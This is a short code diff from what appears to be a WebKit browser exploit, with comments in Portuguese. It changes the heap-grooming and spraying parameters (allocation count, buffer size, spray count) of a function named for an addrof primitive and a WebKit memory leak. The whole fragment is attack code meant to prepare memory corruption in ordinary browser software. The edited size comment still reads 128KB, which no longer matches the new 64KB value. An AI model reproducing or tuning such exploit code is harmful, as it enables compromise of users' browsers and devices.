@@ -56,8 +56,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // ETAPA 1: HEAP GROOMING & SPRAYING (LÓGICA ATUALIZADA)
         // =================================================================
         logS3("--- ETAPA 1 (R45): Heap Grooming & Spraying ---", "subtest");
-        const GROOM_ALLOC_COUNT = 512;
-        const GROOM_ALLOC_SIZE = 128 * 1024; // 128KB por buffer de grooming
+        const GROOM_ALLOC_COUNT = 1024;
+        const GROOM_ALLOC_SIZE = 64 * 1024; // 128KB por buffer de grooming
         const SPRAY_COUNT = 256;
         
         // FASE 1.1: Alocar buffers para segmentar e organizar o heap
